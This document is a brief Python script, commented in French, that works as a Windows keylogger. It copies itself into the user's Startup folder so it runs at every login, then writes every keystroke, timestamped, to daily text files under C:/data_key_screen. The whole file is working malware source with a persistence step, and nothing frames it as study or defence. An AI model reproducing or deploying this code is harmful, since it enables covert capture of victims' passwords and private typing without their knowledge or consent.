from pynput.keyboard import Listener

import os
import logging 
import datetime
import time

from shutil import copyfile

username = os.getlogin()
nomFichierActuelle = os.path.basename(__file__)

# **** AU DEMARRAGE
copyfile(nomFichierActuelle,f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nomFichierActuelle}")

# **** EMPLACEMENT SAUVEGARDE
nomEmplacementSauvegarde = "C:/data_key_screen"
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)

dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
dateheure = datetime.datetime.now().strftime('%H:%M:%S')

nomEmplacementSauvegarde += "/" + datetime.datetime.now().strftime('%Y-%m-%d') #dossier à la date de aujourd'hui
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)
nomfile = username + " touch " + dateajd + ".txt"

# **** YEAH SAUGARDES DES TOUCHE SUR FICHIER TXT
logging_dir = nomEmplacementSauvegarde
FORMATT = dateheure + " %(message)s"
logging.basicConfig(filename=f"{logging_dir}/{nomfile}", level=logging.DEBUG, format=FORMATT)


def on_press(key):
	print(key)
	logging.info(key)

with Listener(on_press=on_press) as lis:
    lis.join()
   
    

	  

